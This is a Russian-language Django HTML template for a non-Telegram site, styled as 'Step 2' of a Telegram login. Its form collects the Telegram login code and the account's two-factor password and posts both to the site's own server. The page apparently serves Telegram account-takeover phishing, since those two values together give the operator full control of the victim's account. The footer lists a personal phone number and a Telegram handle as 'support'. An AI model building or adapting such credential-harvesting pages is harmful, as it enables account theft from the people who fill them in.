<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение кода Telegram</title>
    <style>
        :root {
            --primary: #FFD900;
            --dark: #121212;
            --darker: #0A0A0A;
            --light: #FFFFFF;
            --gray: #2E2E2E;
            --red: #FF4D4D;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #000000, #1A1A1A);
            margin: 0;
            min-height: 100vh;
            color: var(--light);
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .back-btn {
            position: absolute;
            top: 30px;
            left: 30px;
            background: rgba(255, 255, 255, 0.1);
            color: var(--light);
            border: none;
            border-radius: 8px;
            padding: 8px 15px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .back-btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .back-btn svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
        }

        h2 {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary);
            text-align: center;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--primary);
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            font-size: 15px;
            box-sizing: border-box;
            background: rgba(255, 255, 255, 0.05);
            color: var(--light);
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(255, 217, 0, 0.2);
        }

        button[type="submit"] {
            width: 100%;
            padding: 14px;
            background-color: var(--primary);
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        button[type="submit"]:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 217, 0, 0.3);
        }

        .support-footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            line-height: 1.6;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .support-footer a {
            color: var(--primary);
            text-decoration: none;
            transition: opacity 0.3s ease;
            margin: 0 5px;
        }

        .support-footer a:hover {
            opacity: 0.8;
            text-decoration: underline;
        }

        @media (max-width: 600px) {
            .container {
                padding: 25px;
            }

            h2 {
                font-size: 22px;
            }

            .back-btn {
                top: 15px;
                left: 15px;
                padding: 6px 12px;
                font-size: 13px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn" onclick="window.history.back()">
            <svg viewBox="0 0 24 24">
                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
            </svg>
            Назад
        </button>

        <h2>Шаг 2: Подтвердите вход</h2>

        <form method="post" action="{% url 'puddle:confirm_telegram_code' %}">
            {% csrf_token %}

            <div>
                <label>Код из Telegram:</label>
                <input type="text" name="code" required>
            </div>

            <div>
                <label>Пароль (если включена 2FA):</label>
                <input type="password" name="password">
            </div>

            <button type="submit">Подтвердить</button>
        </form>

        <div class="support-footer">
            Поддержка: <a href="tel:+79510397291">+7 (951) 039-72-91</a> |
            <a href="https://t.me/xparispom" target="_blank">@xparispom</a>
        </div>
    </div>
</body>
</html>
